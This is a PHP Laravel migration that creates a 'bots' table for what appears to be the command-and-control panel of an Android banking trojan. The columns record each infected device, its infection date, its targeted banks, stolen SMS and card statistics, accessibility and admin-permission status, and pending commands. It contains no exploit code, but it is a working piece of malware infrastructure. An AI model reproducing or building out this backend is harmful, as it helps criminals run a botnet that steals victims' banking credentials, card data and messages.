<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     *
     * @return void
     */
    public function up()
    {
        Schema::create('bots', function (Blueprint $table) {
            $table->id();
            $table->string('bot_id');
            $table->string('ip')->default('');
            $table->string('operator')->default('');
            $table->string('phone_number')->default('');
            $table->string('model')->default('');
            $table->string('android')->default('');
            $table->string('tag')->default('');
            $table->string('country')->default('');
            $table->string('last_connect')->default('');
            $table->string('date_infection')->default('');
            $table->string('commands')->default('');
            $table->string('banks')->default('');
            $table->string('comment')->default('');
            $table->string('stat_protect')->default('');
            $table->string('stat_screen')->default('');
            $table->string('stat_accessibility')->default('');
            $table->string('stat_sms')->default('');
            $table->string('stat_cards')->default('');
            $table->string('stat_banks')->default('');
            $table->string('stat_mails')->default('');
            $table->string('active_device')->default('');
            $table->string('time_working')->default('');
            $table->string('stat_download_module')->default('');
            $table->string('stat_admin')->default('');
            $table->string('update_settings')->default('');
            $table->string('locale')->default('');
            $table->string('battery_level')->default('');
            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     *
     * @return void
     */
    public function down()
    {
        Schema::dropIfExists('bots');
    }
};
